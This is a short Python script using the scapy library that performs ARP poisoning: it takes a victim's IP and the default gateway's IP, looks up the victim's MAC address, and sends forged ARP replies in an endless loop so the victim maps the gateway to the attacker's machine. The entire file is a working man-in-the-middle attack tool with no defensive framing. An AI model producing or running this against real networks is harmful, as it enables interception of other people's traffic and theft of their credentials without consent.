from scapy.all import *
import argparse

#Input the IP's
parser = argparse.ArgumentParser(description="Simple ARP poisoning script")
parser.add_argument("target_ip", help="IP address of the victim")
parser.add_argument("defgw_ip", help="IP address of the default gateway")
args = parser.parse_args()

target_ip = args.target_ip  #Victim's IP
defgw_ip  = args.defgw_ip   #Victim's Default Gateway

# Automatically resolve target MAC address via ARP request
def get_mac(ip):
    ans, _ = sr(ARP(op=1, pdst=ip), timeout=2, verbose=0)  # op=1 = who-has (request)
    for _, rcv in ans:
        return rcv[ARP].hwsrc
    return None

target_mac = get_mac(target_ip) #Victim's MAC Address

#Debug
if target_mac is None:
    print(f"Could not find MAC address for {target_ip}.")
    exit()

print(f"Found target MAC: {target_mac}")

#Send ARP packet saying that the MAC Address correspondent of the default gateway is the attacker's
ether   = Ether(dst=target_mac)
arp     = ARP(
        op=2,
        psrc=defgw_ip,
        pdst=target_ip,
)

sendp(ether/arp, inter=0.2, loop=1)
